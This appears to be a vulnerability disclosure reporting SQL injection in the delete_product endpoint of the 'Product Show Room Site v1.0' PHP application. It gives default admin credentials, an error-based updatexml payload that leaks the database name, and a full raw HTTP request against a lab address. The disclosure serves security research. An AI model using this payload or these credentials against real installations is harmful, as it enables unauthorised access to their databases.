# Product Show Room Site v1.0 by oretnom23 has SQL injection

Vul_Author: XuBoyu

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/classes/Master.php?f=delete_product

Vulnerability location: /psrs/classes/Master.php?f=delete_product, id

Current database name: psrs_db ,length is 7

[+] Payload: id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /psrs/classes/Master.php?f=delete_product HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/psrs/admin/?page=products
Content-Length: 65
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close

id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/40672808/171572214-983ee6ab-330a-47ab-a2da-d3ab15bf3b65.png)
